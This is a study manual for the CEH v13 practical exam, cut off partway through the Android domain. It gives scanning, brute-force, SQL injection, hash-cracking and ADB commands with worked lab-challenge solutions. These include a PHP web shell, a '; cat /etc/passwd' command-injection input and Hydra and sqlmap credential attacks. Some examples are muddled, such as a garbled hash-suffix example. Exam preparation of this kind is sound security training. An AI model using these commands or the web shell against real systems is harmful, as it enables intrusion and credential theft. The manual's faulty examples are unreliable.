# CEH v13 Practical Exam - Complete Study Manual

**Version:** 1.1  
**Last Updated:** June 2026  
**Status:** GitHub Pages Ready  
**Exam Duration:** 6 Hours  
**Passing Score:** 70% (14 out of 20 challenges)  
**Certificate Validity:** 3 Years  
**Target Audience:** Exam-takers with open-book access during practical exam

---

## How to Use This Manual

This manual is designed as an **open-book reference during your 6-hour practical exam**. It contains:

- **Domain-by-domain breakdown** of all 7 exam domains with command syntax
- **Real challenge examples** with step-by-step solutions
- **Tools reference section** for quick command lookup
- **Exam strategy** for time management and answer formatting
- **Cross-referenced navigation** to jump between related topics

**During the Exam:**
1. Keep this manual accessible in a browser tab
2. Use Ctrl+F to search for specific tools or commands
3. Reference challenge examples for similar scenarios
4. Check "Critical Success Factors" when stuck on format

---

## Quick Navigation

- [Exam Overview](#exam-overview)
- [Domain 1: Network Scanning & Enumeration](#domain-1-network-scanning--enumeration)
- [Domain 2: System Hacking & Exploitation](#domain-2-system-hacking--exploitation)
- [Domain 3: Web Server & Application Hacking](#domain-3-web-server--application-hacking)
- [Domain 4: Cryptography & Steganography](#domain-4-cryptography--steganography)
- [Domain 5: Mobile & IoT Security](#domain-5-mobile--iot-security)
- [Domain 6: Traffic Analysis & Sniffing](#domain-6-traffic-analysis--sniffing)
- [Domain 7: Wireless Network Cracking](#domain-7-wireless-network-cracking)
- [Essential Tools Reference](#essential-tools-reference)
- [Exam Strategy & Tips](#exam-strategy--tips)

---

## Table of Contents

1. [Exam Overview & Core Concepts](#exam-overview)
   - What is the CEH Practical Exam
   - Exam Format, Duration & Scoring
   - Operating Systems & Environment
   - Core Competencies Required

2. [Domain 1: Network Scanning & Enumeration](#domain-1-network-scanning--enumeration)
   - Host Discovery (NMAP Ping Scans)
   - Port Scanning (TCP, UDP, SYN)
   - Service Version Detection (-sV flag)
   - SMB Enumeration (NMAP scripts, Enum4Linux)
   - SNMP Enumeration
   - DNS Enumeration
   - Challenge Examples & Solutions

3. [Domain 2: System Hacking & Exploitation](#domain-2-system-hacking--exploitation)
   - RDP Cracking (Hydra bruteforce)
   - File Encryption & Decryption (CryptoForge, SHA hashing)
   - SMB Exploitation (Weak credentials, share access)
   - Hydra - General Credential Cracking
   - Challenge Examples & Solutions

4. [Domain 3: Web Server & Application Hacking](#domain-3-web-server--application-hacking)
   - SQL Injection (SQLMAP automated exploitation)
   - Web Directory Enumeration (Nikto, Robuster)
   - DVWA - Vulnerable Web Application
   - Parameter Tampering
   - WordPress Scanning (WPScan)
   - Challenge Examples & Solutions

5. [Domain 4: Cryptography & Steganography](#domain-4-cryptography--steganography)
   - Hash Identification & Cracking (Hashcat, John)
   - File Steganography (Steghide, Stegcracker)
   - VeraCrypt - Encrypted Volume Cracking
   - PE File Analysis - Malware Static Analysis
   - Challenge Examples & Solutions

6. [Domain 5: Mobile & IoT Security](#domain-5-mobile--iot-security)
   - Android Device Access via ADB
   - Analyzing Extracted Android Data
   - Challenge Examples

7. [Domain 6: Traffic Analysis & Sniffing](#domain-6-traffic-analysis--sniffing)
   - Wireshark - Network Packet Analysis
   - DDoS Attack Analysis
   - IoT & Protocol Analysis (MQTT)
   - Challenge Examples

8. [Domain 7: Wireless Network Cracking](#domain-7-wireless-network-cracking)
   - WPA/WPA2 Password Cracking (Aircrack-ng)
   - Wireless Attack Workflow (5 steps)
   - Challenge Examples

9. [Essential Tools Reference](#essential-tools-reference)
   - Scanning & Enumeration Tools
   - Credential Cracking Tools
   - Web Application Testing Tools
   - Cryptography & Steganography Tools
   - Network Analysis Tools
   - Mobile & IoT Tools

10. [Exam Strategy & Tips](#exam-strategy--tips)
    - Pre-Exam Preparation
    - 6-Hour Time Management Strategy
    - Critical Success Factors
    - Common Mistakes to Avoid
    - Practice Challenges Breakdown
    - Challenge Clustering by Difficulty
    - Exam Day Checklist

---

## Exam Overview

### What is the CEH Practical Exam?

The Certified Ethical Hacker (Practical) is a real-world, hands-on exam testing your ability to identify and exploit security vulnerabilities. You'll work through 20 real-world scenarios using actual hacking tools and techniques within a 6-hour window.

**Key Points:**
- Browser-based exam environment (iLabs Cyber Range)
- Two operating systems provided: Parrot OS and Windows 7/11
- You can use the internet to look up information (but not ask people or chat)
- Takes place on a website called iLab with virtual machines
- Proctor monitors via GoToMeeting throughout the exam

> **TIP:** This is a practical exam, not multiple choice. You must actually exploit vulnerabilities and submit exact answers. No partial credit.

### How the Exam Works

**Before You Start:**
- Account creation on EC-Council's Aspen portal
- Purchase exam voucher from the official EC-Council store
- Schedule your exam date
- Identity verification via proctor

**During the Exam:**
- Start with easy challenges first (scanning/reconnaissance)
- Work through challenges sequentially
- Answer is formatted exactly as specified (case-sensitive for letters)
- Can move to next challenge and return later
- Use tools provided in the environment

**Timing Strategy:**
- Spend 15-20 minutes per challenge on average
- Start with NMAP scans (they take time, so run them first)
- Return to scanning results while working other challenges
- Skip hard challenges and come back if time permits

### What You'll Need to Know

**Operating Systems:**
- Linux (Parrot Security OS / Kali)
- Windows (7 or 11)
- Basic command-line navigation
- File system basics

**Core Competencies:**
- Network reconnaissance and mapping
- Service enumeration and exploitation
- Credential cracking (RDP, FTP, SSH, SMB, SQL)
- Web application testing (SQL injection, parameter tampering)
- Cryptography and file encryption/decryption
- Mobile device access (Android via ADB)
- Packet analysis and traffic inspection
- Wireless network penetration testing

---

## Domain 1: Network Scanning & Enumeration

### Why This Matters

Network scanning is the foundation of every penetration test. You need to discover what's on the network, what ports are open, and what services are running. This is where you gather the intelligence to plan your attacks.

Think of it like reconnaissance: a burglar doesn't just kick down the door—they case the joint first, checking doors and windows.

> **EXAM TIP:** Always start with comprehensive network scans immediately—they take time to run. Work on other challenges while scans complete.

### 1.1 Host Discovery - Finding Live Machines

**What it does:** Identifies which IP addresses have active machines on them.

#### Command: NMAP Ping Scan

```bash
nmap -sn 192.168.1.0/24
```

**Breakdown:**
- `-sn` = Ping scan only (don't do port scanning)
- `192.168.1.0/24` = Check all 256 IPs in this range
- Shows which machines are alive
- Much faster than checking every single IP manually

**Alternative Methods:**
```bash
# ARP ping (works locally on network)
nmap -sP 10.10.55.0/24

# TCP SYN ping (useful if ICMP is blocked)
nmap -sS -P 10.10.55.0/24

# UDP ping (alternative method)
nmap -sU -P 10.10.55.0/24

# Using netdiscover tool
netdiscover -i eth0 -r 192.168.1.0/24
```

**Expected Output:**
```
Starting Nmap...
Nmap scan report for 192.168.1.1
Host is up (0.0023s latency).
Nmap scan report for 192.168.1.5
Host is up (0.0045s latency).
```

**Why This Matters:** Helps you quickly identify active targets in large networks without wasting time on dead IPs.

---

### 1.2 Port Scanning - What Services Are Running

**What it does:** Checks specific ports on a host to see if services are listening.

#### The Three Main Scan Types

**TCP Connect Scan (Full Connection)**
```bash
nmap -sT -v 192.168.1.5
```
- Complete three-way handshake
- Slowest but most reliable
- Leaves logs on target
- Use when you're not worried about stealth

**TCP SYN Scan (Half-Open / Stealthy)**
```bash
nmap -sS -v 192.168.1.5
```
- Sends SYN, waits for SYN-ACK, sends RST (no completion)
- Faster than full connect
- Less logging on older systems
- Preferred for most scans

**UDP Scan**
```bash
nmap -sU -v 192.168.1.5
```
- Tests UDP ports (SNMP, DNS, DHCP)
- Slower and less reliable
- Use when targeting specific UDP services

#### Common Port Scanning Commands

```bash
# Scan specific ports on target
nmap -p 22,80,443 192.168.1.5

# Scan ports 1-1000 on target
nmap -p 1-1000 192.168.1.5

# Scan ALL 65535 ports (thorough but slow)
nmap -p- 192.168.1.5

# Fast scan (only top 100 ports)
nmap -F 192.168.1.5

# Aggressive scan with OS detection
nmap -A -T4 192.168.1.5

# Show only open ports
nmap --open 192.168.1.5
```

**Understanding Port States:**

| State | Meaning | Action |
|-------|---------|--------|
| **Open** | Service is listening and accepting connections | Exploit or enumerate |
| **Closed** | Port responded but no service is listening | Usually safe to ignore |
| **Filtered** | Firewall is blocking the port | May indicate protected service |
| **Unfiltered** | Port is accessible but unclear if service exists | Investigate further |

> **EXAM MISTAKE:** Don't skip ports because "standard" tools seem comprehensive. Always scan all 65,535 ports on key targets—MariaDB might be on 3307, not 3306.

---

### 1.3 Service Version Detection - What Software is Running

**What it does:** Identifies specific software and version numbers running on open ports.

```bash
nmap -sV 192.168.1.5
```

**Breakdown:**
- `-sV` = Version detection
- Connects to each open port and fingerprints the service
- Returns software name and version
- Takes longer than basic port scan

**Example Output:**
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6
443/tcp open  https   Apache httpd 2.4.6
3306/tcp open mysql  MySQL 5.7.17
```

**Why This Matters:** Version numbers let you know if the software has known exploits. Old versions = more vulnerabilities.

#### Comprehensive Scanning

The "gold standard" for initial reconnaissance:

```bash
nmap -A -T4 -p- 192.168.1.5
```

**Breakdown:**
- `-A` = All: enables OS detection, version detection, script scanning
- `-T4` = Timing template (faster, less stealthy)
- `-p-` = All 65,535 ports
- Returns comprehensive information about the target

---

### 1.4 SMB Enumeration - Finding Windows Shared Resources

**What it does:** Discovers Windows file shares, users, and domain information.

#### NMAP SMB Scripts

```bash
# Discover OS, domain, workgroup
nmap --script smb-os-discovery.nse -p445 192.168.1.5
```

**Expected Output:**
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-os-discovery:
|   OS: Windows 7 (Build 7601)
|   Computer name: WORKSTATION1
|   Domain: ACME
|   Workgroup: WORKGROUP
```

```bash
# Enumerate users on Windows system
nmap --script smb-enum-users.nse -p445 192.168.1.5
```

```bash
# Enumerate shares available
nmap -p445 --script=smb-enum-shares.nse 192.168.1.5
```

**Expected Output:**
```
HOST|445|smb-enum-shares:
  Share        Type  Comment
  ----         ----  -------
  C$           STYPE_DISKTREE  Default share
  IPC$         STYPE_IPC       Remote IPC
  Users        STYPE_DISKTREE  User files
  Documents    STYPE_DISKTREE  Shared documents
```

#### Using SMBClient for Access

```bash
# List shares on a system
smbclient -L 192.168.1.5

# Access a share
smbclient //192.168.1.5/Documents

# Download files
smbget -R smb://192.168.1.5/Documents
```

#### Enum4Linux - Comprehensive SMB Enumeration

```bash
# Get all info (-a for all)
enum4linux -a 192.168.1.5

# Get users only (-U)
enum4linux -U 192.168.1.5

# Get shares only (-S)
enum4linux -S 192.168.1.5

# Get groups (-G)
enum4linux -G 192.168.1.5

# Get password policy (-P)
enum4linux -P 192.168.1.5

# With credentials
enum4linux -u admin -p password123 -a 192.168.1.5
```

**Why This Matters:** SMB often reveals user names, domain structure, and accessible file shares without any authentication.

---

### 1.5 SNMP Enumeration - Extracting System Information

**What it does:** Queries network devices (routers, printers, servers) for configuration info.

SNMP is like a public information billboard for network devices. Many admins leave it with default credentials.

```bash
# Basic SNMP check
nmap -sU -p 161 --script snmp-processes.nse 192.168.1.5

# Using snmp-check tool
snmp-check 192.168.1.5

# Using onesixtyone for SNMP discovery
onesixtyone 192.168.1.0/24
```

**Common SNMP Community Strings (Passwords):**
- `public` (read-only, default)
- `private` (read-write)
- `community`
- `manager`

---

### 1.6 DNS Enumeration - Finding Hostnames and IPs

**What it does:** Maps domain names to IP addresses and discovers subdomains.

```bash
# DNS lookup
nslookup target.com

# More detailed DNS lookup
dig target.com

# Zone transfer attempt (finds all DNS records)
dig @ns1.target.com target.com axfr

# Reverse DNS lookup (IP to hostname)
nslookup 192.168.1.5
```

**Online DNS Tools:**
- https://www.nslookup.io/ (browser-based, useful during exam)

---

### Challenge Examples: Domain 1

#### Challenge 1: Find Domain Controller DNS Name

**Question:** Conduct a comprehensive scan of the network to identify the DNS computer name of the Domain Controller.

**Answer Format:** AaaaaAaaa*AAAAAA*aaa

**Solution Steps:**

1. Run aggressive NMAP scan with OS detection:
```bash
nmap -A -T4 192.168.1.0/24
```

2. Look for Windows domain controllers (usually port 389/LDAP, 445/SMB)

3. Use SMB enumeration to get domain info:
```bash
nmap --script smb-os-discovery.nse -p445 [DC_IP]
```

4. Computer name will be in the output

#### Challenge 2: Find IMAP Mercury Service Version

**Question:** Identify the version of the IMAP Mercury service running on a Windows development server.

**Answer Format:** N*NN (Example: 1.45)

**Solution Steps:**

1. Scan all ports looking for IMAP (usually 143 or 993):
```bash
nmap -p- -sV -T4 10.10.55.0/24
```

2. Find the server running Mercury/IMAP

3. Version will be shown in the nmap output

4. Extract last two digits (e.g., version 1.45 → answer is 1.45)

#### Challenge 5: Find MariaDB Port

**Question:** Determine the port on which MariaDB service is running.

**Answer Format:** NNNNN (Example: 03306)

**Solution Steps:**

1. Scan target for all ports:
```bash
nmap -sV -p- -T4 10.10.55.11
```

2. Look for MySQL/MariaDB service in output

3. Port number is your answer (pad with zeros if needed)

---

## Domain 2: System Hacking & Exploitation

### Why This Matters

Once you've discovered what's running, the next step is to access systems using weak credentials or known vulnerabilities. This domain tests your ability to crack passwords, exploit services, and extract files.

> **CRITICAL:** Always try default credentials first before running cracking tools. Many systems still use admin/admin or guest/guest.

---

### 2.1 RDP Cracking - Remote Desktop Access

**What it does:** Brute force or crack Windows Remote Desktop credentials to gain access to systems.

**Port:** 3389

#### Finding RDP Systems

```bash
# Scan for RDP on a subnet
nmap -p3389 --open 10.10.55.0/24 -T4
```

#### Using Hydra to Crack RDP

```bash
# Basic RDP brute force
hydra -l Jones -P passwords.txt rdp://10.10.55.45 -f

# Important: Try both uppercase and lowercase usernames
hydra -l jones -P passwords.txt rdp://10.10.55.45 -f

# With multiple usernames
hydra -L usernames.txt -P passwords.txt rdp://10.10.55.45
```

**Flags:**
- `-l` = Single username
- `-L` = File with list of usernames
- `-P` = Password file (rockyou.txt has 14 million passwords)
- `-f` = Stop after first successful login
- `rdp://` = Protocol to use

**Where to Get Word Lists:**
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/common.txt
```

#### Connecting to Compromised RDP

**From Linux:**
```bash
xfreerdp /u:Jones /p:password123 /v:10.10.55.45
```

**From Windows:**
```bash
mstsc
# GUI will open - type IP and credentials
```

**Once Connected:**
- Navigate file system like normal user
- Access Documents, Downloads folders
- Extract sensitive files

---

### 2.2 File Encryption & Decryption

**What it does:** Decrypt encrypted files (like .cfe CryptoForge files) to access hidden data.

#### CryptoForge Decryption

CryptoForge is a Windows encryption tool. Many encrypted files have .cfe extension.

**Manual Decryption:**
1. Locate encrypted file (often has .cfe extension)
2. Right-click file → "Decrypt"
3. Enter password (usually provided in the challenge)
4. Save decrypted file

#### Calculating File Hashes

After decryption, you often need to hash the file:

```bash
# SHA1 hash
sha1sum decryptedimage.jpg
# Output: a1b2c3d4e5f6g7h8i9j0 decryptedimage.jpg

# SHA256 hash
sha256sum decryptedimage.jpg

# MD5 hash
md5sum decryptedimage.jpg
```

**Challenge Pattern:**
- Decrypt file → Get hash → Submit last 6 digits

Example: If SHA1 is `a1b2c3d4e5f6`, answer is `e5f6d4e5` (last 6 chars)

---

### 2.3 SMB Exploitation - Weak Share Credentials

**What it does:** Access Windows SMB shares with weak or default credentials.

#### Discovering SMB Shares

```bash
# See what shares are available
nmap -p445 --script smb-enum-shares.nse 192.168.1.5

# Detailed enumeration
enum4linux -S 192.168.1.5
```

#### Accessing SMB Shares

```bash
# Connect to share
smbclient //192.168.1.5/sharename

# With credentials
smbclient //192.168.1.5/sharename -U username -P password

# View files
smb> ls

# Download file
smb> get filename.txt

# Exit
smb> exit
```

#### SMBget for Bulk Download

```bash
# Download entire directory
smbget -R smb://192.168.1.5/sharename
```

**Challenge Pattern:**
- Find system with SMB open
- Try default credentials (guest, anonymous, admin/admin)
- Access share and retrieve file
- Read file content

---

### 2.4 Hydra - General Credential Cracking

Hydra is the universal password-cracking tool. Works on multiple services.

#### Basic Hydra Syntax

```bash
hydra -l username -P passwordlist.txt service://target
```

#### Common Services

```bash
# FTP
hydra -l username -P wordlist.txt ftp://192.168.1.5

# SSH
hydra -l username -P wordlist.txt ssh://192.168.1.5

# Telnet
hydra -l username -P wordlist.txt telnet://192.168.1.5

# HTTP (POST request)
hydra -l username -P wordlist.txt 192.168.1.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# HTTP (GET request)
hydra -l username -P wordlist.txt 192.168.1.5 http-get /admin/

# SMB
hydra -l username -P wordlist.txt smb://192.168.1.5
```

**Critical Flags:**
- `-t 4` = Number of threads (4 is good balance)
- `-f` = Stop after first success
- `-v` = Verbose output
- `-o results.txt` = Save results to file

#### Best Practices

1. **Use targeted word lists first:**
   - Create custom list with likely passwords
   - Try common patterns first (password123, admin, etc.)

2. **Test single password before bulk attack:**
   ```bash
   hydra -l admin -p password123 rdp://192.168.1.5
   ```

3. **Monitor for account lockouts:**
   - Some systems lock after 3-5 failed attempts
   - Use slower thread count (-t 1 or 2)

---

### Challenge Examples: Domain 2

#### Challenge 3: RDP Crack + File Hash

**Question:** Identify RDP on 10.10.55.0/24, crack user "Jones" password, decrypt forger.cfe file, get SHA1 hash of decrypted image (last 6 digits).

**Answer Format:** NNaaNN

**Solution Steps:**

1. Scan for RDP:
```bash
nmap -p3389 --open 10.10.55.0/24 -T4
```

2. Crack RDP password:
```bash
hydra -l Jones -P passwords.txt rdp://[FOUND_IP] -f
```

3. Connect to system:
```bash
xfreerdp /u:Jones /p:[PASSWORD] /v:[IP]
```

4. Locate forger.cfe file (check Documents, Downloads)

5. Right-click → Decrypt (password provided in question)

6. Open terminal in decrypted file location:

```bash
sha1sum decryptedimage.jpg
```

7. Get last 6 characters of hash

#### Challenge 8: SMB Access + File Content

**Question:** Access SMB share using weak credentials, retrieve QuantumCoder.txt content.

**Answer Format:** Aa*aNaaNNa

**Solution Steps:**

1. Find SMB share:
```bash
nmap -p445 --script smb-enum-shares.nse 10.10.55.0/24
```

2. Try default credentials (guest, admin/admin, anonymous):
```bash
smbclient //10.10.55.X/sharename -U guest
```

3. List files:
```bash
smb> ls
```

4. Download file:
```bash
smb> get QuantumCoder.txt
```

5. Read content:
```bash
cat QuantumCoder.txt
```

6. Submit exact content

---

## Domain 3: Web Server & Application Hacking

### Why This Matters

Web applications are everywhere, and they're often full of vulnerabilities. SQL injection, parameter tampering, and directory traversal are common security flaws that can expose sensitive data or allow code execution.

---

### 3.1 SQL Injection - Extracting Database Content

**What it does:** Insert SQL code into web forms to manipulate database queries and extract data.

#### Understanding SQL Injection

Normal query: `SELECT * FROM users WHERE username='admin' AND password='password'`

Injected query: `SELECT * FROM users WHERE username='admin' --' AND password='password'`

The `--` comments out the password check, so you can login as admin without password.

#### SQLMAP - Automated SQL Injection

SQLMAP is the go-to tool for finding and exploiting SQL injection vulnerabilities.

**Basic Workflow:**

1. **Find vulnerable parameter:**
```bash
# Test login form
sqlmap -u "http://cinema.cehorg.com/login.php" --forms
```

2. **Enumerate databases:**
```bash
sqlmap -u "http://cinema.cehorg.com/login.php?id=1" --dbs
```

3. **List tables in database:**
```bash
sqlmap -u "http://cinema.cehorg.com/login.php?id=1" -D cinema --tables
```

4. **Dump entire table:**
```bash
sqlmap -u "http://cinema.cehorg.com/login.php?id=1" -D cinema -T users --dump
```

5. **Extract specific column:**
```bash
sqlmap -u "http://cinema.cehorg.com/login.php?id=1" -D cinema -T users -C password --dump
```

#### Getting Cookies for SQLMAP

When a page requires authentication, you need to pass the session cookie:

1. Open website in browser
2. Login normally
3. Open Developer Tools (F12)
4. Console → type: `document.cookie`
5. Copy the cookie

```bash
sqlmap -u "http://cinema.cehorg.com/api.php" --cookie="PHPSESSID=abc123def456" -D cinema -T users --dump
```

---

### 3.2 Web Directory Enumeration - Finding Hidden Files

**What it does:** Discovers hidden directories and files on web servers.

#### Using Nikto

Nikto scans web servers for vulnerabilities and misconfiguration:

```bash
nikto -h http://192.168.1.5:8080 -Tuning 1
```

**Output shows:**
- Outdated software
- Potentially dangerous files
- Configuration errors

#### Using Robuster / DIRB

Brute force directories and files:

```bash
# Robuster with common word list
robuster dir -u 10.10.10.10 -w /usr/share/dirb/wordlists/common.txt -x .txt

# Using uniscan for directories
uniscan -u http://10.10.10.12:8080/CEH -q

# Check for robots.txt and sitemap.xml
uniscan -u http://10.10.10.12:8080/CEH -we
```

#### Common Hidden Files to Look For

- `/admin/`
- `/admin.php`
- `/login.php`
- `/config/`
- `/database.sql`
- `/backup/`
- `/robots.txt`
- `/sitemap.xml`
- `/.git/`
- `/.env`

---

### 3.3 DVWA - Damn Vulnerable Web Application

DVWA is a intentionally vulnerable web app used for practice. Many exam challenges mirror DVWA.

#### Accessing DVWA

```
http://192.168.44.32:8080/DVWA
```

**Default Credentials:** admin / password

#### Common DVWA Vulnerabilities

**1. Command Execution**
```html
Input: ; cat /etc/passwd
```

This allows running shell commands through the web form.

**2. File Upload**
- Upload PHP shell
- Execute commands through browser

**3. SQL Injection**
- Inject SQL in login form
- Extract database content

#### DVWA File Enumeration

```bash
# List files in upload directory
type "C:\wamp64\www\DVWA\SecureWeb\prod\*"  # Windows

# Check for base64 encoded files
# Decode base64 ciphers in the directory
echo "base64string" | base64 -d
```

---

### 3.4 Parameter Tampering - Modifying Request Parameters

**What it does:** Change URL parameters or POST data to manipulate application behavior.

#### Simple Parameter Tampering

**Original URL:** `http://www.cehorg.com/index.php?page_id=1`

**Modified URL:** `http://www.cehorg.com/index.php?page_id=103`

This might reveal hidden pages or different content.

#### Using Burp Suite to Tamper

1. Set proxy in browser: 127.0.0.1:8080
2. Open Burp Suite
3. Capture request
4. Right-click → Send to Repeater
5. Modify parameters
6. Send request and observe response

---

### 3.5 WordPress Scanning - WPScan

WordPress sites often have vulnerable plugins.

```bash
# Enumerate users
wpscan --url http://target.com --enumerate u

# Enumerate plugins
wpscan --url http://target.com --enumerate p

# Enumerate themes
wpscan --url http://target.com --enumerate t

# Full enumeration
wpscan --url http://target.com --enumerate ap
```

---

### Challenge Examples: Domain 3

#### Challenge 13: SQL Injection - Extract Password

**Question:** Extract password for user "Matthew" from cinema.cehorg.com SQL injection vulnerability.

**Answer Format:** NNNNNNNN (8-digit number)

**Solution Steps:**

1. Login with provided credentials (Sarah/abc123)

2. Find vulnerable parameter (usually login, search, or ID)

3. Test for SQL injection:
```bash
sqlmap -u "http://cinema.cehorg.com/login.php" --forms
```

4. Enumerate databases:
```bash
sqlmap -u "http://cinema.cehorg.com/login.php?id=1" --dbs
```

5. Dump users table:
```bash
sqlmap -u "http://cinema.cehorg.com/login.php?id=1" -D cinema -T users --dump
```

6. Find Matthew's password field

#### Challenge 14: Parameter Tampering - Find Flag

**Question:** Explore www.cehorg.com and find flag on page_id=103.

**Answer Format:** N*aA*a

**Solution Steps:**

1. Navigate to: `http://www.cehorg.com/index.php?page_id=103`

2. Look at page source (Ctrl+U) for hidden content

3. The flag might be in HTML comments or visible on page

4. Submit exact flag value

#### Challenge 15: Web Vulnerability - Find phantom.txt

**Question:** Exploit training.cehorg.com vulnerability to find phantom.txt content.

**Answer Format:** AAaa*aa

**Solution Steps:**

1. Try direct access:
```
http://training.cehorg.com/phantom.txt
```

2. If not accessible, enumerate directories:
```bash
robuster dir -u training.cehorg.com -w /usr/share/dirb/wordlists/common.txt
```

3. Look for upload functionality or file traversal

4. Use SQLMAP if database access needed

#### Challenge 17: DVWA File Upload + Base64 Decode

**Question:** Upload files to DVWA, decode base64 ciphers to find original message.

**Answer Format:** AaaN*aNaN

**Solution Steps:**

1. Login to DVWA with admin/password

2. Go to File Upload vulnerability

3. Upload web shell (PHP file):
```php
<?php system($_GET['cmd']); ?>
```

4. Execute command to list files:
```
http://192.168.44.32:8080/DVWA/SecureWeb/prod/?cmd=ls
```

5. Find and read base64 encoded files:
```bash
type "path/to/encoded.txt" | base64 -d
```

6. The decoded message is your answer

---

## Domain 4: Cryptography & Steganography

### Why This Matters

Cryptography protects sensitive data, and knowing how to identify, crack, and decrypt files is critical. Steganography hides data inside images or files—you need to extract it.

---

### 4.1 Hash Identification & Cracking

**What it does:** Identify hash types and crack them using dictionaries or rainbow tables.

#### Hash Identification

```bash
# Using hashid tool
hashid -m "e99a18c428cb38d5f260853678922e03"

# Output shows likely hash type and hashcat mode
```

**Common Hash Types:**

| Type | Length | Example |
|------|--------|---------|
| **MD5** | 32 hex chars | e99a18c428cb38d5f260853678922e03 |
| **SHA1** | 40 hex chars | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| **SHA256** | 64 hex chars | 2c26b46911185131006145f17ed0ca51ebc03acfcee4651d7e4f42813da98e99 |
| **SHA512** | 128 hex chars | longer string... |
| **NTLM** | 32 hex chars | Windows hashes |

#### Cracking Hashes with Hashcat

```bash
# Syntax
hashcat -m [mode] -a 0 [hash] [wordlist]

# MD5 crack (mode 0)
hashcat -m 0 -a 0 e99a18c428cb38d5f260853678922e03 rockyou.txt

# SHA1 crack (mode 100)
hashcat -m 100 -a 0 [hash] rockyou.txt

# SHA256 crack (mode 1400)
hashcat -m 1400 -a 0 [hash] rockyou.txt

# NTLM crack (mode 1000)
hashcat -m 1000 -a 0 [hash] rockyou.txt
```

**Common Hashcat Modes:**

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1000 | NTLM |
| 5500 | NetNTLMv2 |

#### Online Hash Cracking

If hash is common, use online databases:
- https://hashes.com
- https://crackstation.net
- CyberChef online tool

#### Password Cracking with John the Ripper

```bash
# Crack NTLM hashes from PWDUMP
john --format=NT hashes.txt

# Crack using wordlist
john --wordlist=rockyou.txt --format=MD5 hashes.txt

# Show cracked passwords
john --show hashes.txt
```

---

### 4.2 File Steganography - Extracting Hidden Data

**What it does:** Extract data hidden inside images or other files.

#### Steghide - Hide/Extract Data in Images

```bash
# Extract hidden data from image
steghide extract -sf image.jpg

# Will prompt for passphrase (if any)
```

#### Stegcracker - Crack Steganography Passphrase

```bash
# Brute force passphrase using word list
stegcracker image.jpg /usr/share/wordlists/rockyou.txt

# Tries each password until successful
```

#### QuickStego - GUI Steganography Tool

1. Launch QuickStego
2. Open image file
3. If data is hidden, it will show extracted text

#### Online Steganography Tools

```
https://futureboy.us/stegano/decinput.html
```

Upload image → Tool extracts hidden text automatically

---

### 4.3 VeraCrypt - Encrypted Volume Cracking

**What it does:** Decrypt VeraCrypt-encrypted volumes (like encrypted USB drives or file containers).

#### Opening VeraCrypt Volume

1. Launch VeraCrypt application
2. Click "Select File"
3. Choose .vol or encrypted file
4. Click "Mount"
5. Enter password
6. Volume mounts as drive letter
7. Access files inside

#### Cracking VeraCrypt Passwords

If password is hashed in a file:

```bash
# Extract hash from Hashed1nfo.txt
# Use hashcat to crack hash
hashcat -m 13400 -a 0 [hash] rockyou.txt
```

**VeraCrypt Hashcat Mode:** 13400

---

### 4.4 PE File Analysis - Malware Static Analysis

**What it does:** Analyze executable files without running them to identify metadata and signatures.

#### Using Detect It Easy (DIE)

1. Launch DIE tool
2. Open executable file
3. Check "Advance Option" in right pane
4. View File Info → Properties
5. Look for Image Version number

#### Using PE Explorer

1. Open PE Explorer
2. Load .exe file
3. View PE Headers
4. Extract version information

#### CFF Explorer

1. Open CFF Explorer
2. Load executable
3. View File Headers
4. Check Image Version field

#### Command Line Hash Checking

```bash
# Get SHA224 hash of file
sha224sum Ghostware.exe

# Get last 4 characters
# Example: if hash ends in "aB1c", answer is "aB1c"
```

---

### Challenge Examples: Domain 4

#### Challenge 11: SHA224 Hash Last 4 Characters

**Question:** Find SHA224 hash last 4 characters of Ghostware ELF64 executable.

**Answer Format:** NaNa

**Solution Steps:**

1. Locate file at: `C:\Users\Administrator\Documents\Ghostware`

2. Use DIE Tool:
   - Open DIE
   - Open Ghostware file
   - Click "File Info" button
   - Select Method → SHA224
   - View hash

3. Extract last 4 characters

4. Submit (example: if hash is `...a1B2c`, answer is `B2c` — wait, last 4 means `a1B2`)

---

## Domain 5: Mobile & IoT Security

### Why This Matters

Mobile devices store sensitive personal and corporate data. Android devices can be accessed via ADB (Android Debug Bridge) to extract data, analyze file systems, and find hidden information.

---

### 5.1 Android Device Access via ADB

**What it does:** Connect to Android devices and interact with file system, apps, and data.

**Port:** 5555 (Android Debug Bridge)

#### Finding Android Devices

```bash
# Scan for ADB port
nmap -p5555 --open 10.10.55.0/24 -T4
```

#### Connecting to Android Device

```bash
# Set TCP mode on device
adb tcpip 5555

# Connect to device
adb connect 192.168.43.117:5555

# Verify connection
adb devices
```

#### Exploring Android File System

```bash
# Access device shell
adb shell

# List files in sdcard
ls /sdcard/

# Navigate to DCIM (photos)
cd /sdcard/DCIM/
cd camera
ls

# Navigate to Downloads
cd /sdcard/Downloads/
ls

# Read file content
cat filename.txt
```

#### Pulling Files from Device

```bash
# Pull single file to PC
adb pull /sdcard/Documents/secret.txt C:\extracted\

# Pull entire directory
adb pull /sdcard/Downloads C:\extracted\Downloads

# Pull with current directory
adb pull /sdcard/ .
```

#### Pushing Files to Device

```bash
# Push file from PC to device
adb push C:\malware.apk /sdcard/Download/

# Format: adb push [local] [device location]
```

#### Using Tree Command for File Listing

```bash
# After pulling, use tree to visualize structure
tree sdcard/ > filelist.txt

# Shows all files in tree format
# Helps find specific files easily
```

---

### 5.2 Analyzing Extracted Android Data

#### Looking for Sensitive Files

Common locations for sensitive data:
- `/sdcard/DCIM/` - Camera photos
- `/sdcard/Pictures/` - Pictures with hidden data
- `/sdcard/Documents/` - Text files
- `/sdcard/.hidden/` - Hidden folder (dot prefix)
- `/data/data/` - App private data (requires root)

#### File Analysis

**Image Steganography:**
```bash
# Extract hidden data from .bmp or .jpg
steghide extract -sf extracted_image.bmp

# Or use online tool
# https://futureboy.us/stegano/decinput.html
```

---

### Challenge Examples: Domain 5

#### Challenge 4: Android Steganography - Extract Secret Code

**Question:** Access Android device on port 5555, extract hidden data from .bmp file, decode it.

**Answer Format:** A*aaaaaN*a

**Solution Steps:**

1. Find Android device:
```bash
nmap -p5555 --open 10.10.55.0/24 -T4
```

2. Connect:
```bash
